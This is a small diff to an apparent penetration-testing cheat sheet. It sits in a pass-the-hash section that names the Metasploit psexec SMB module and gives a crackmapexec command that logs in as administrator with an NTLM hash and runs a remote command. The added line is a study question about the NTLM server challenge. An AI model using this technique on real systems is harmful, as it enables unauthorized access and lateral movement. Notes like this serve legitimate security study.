@@ -457,6 +457,8 @@ PASS THE HASH (need to know NtLM hash)
 metasploit exploit/windows/smb/psexec module
 (or)
 crackmapexec winrm 10.0.27.38 -u administrator -H '$HASH' -x "sysinfo"
+
+In the NTLM authentication process, what is the purpose of the server's challenge? > To generate a unique value that the client must respond to for verification.
 __________________________________________________________________________________________________________________________________
 
 Linux
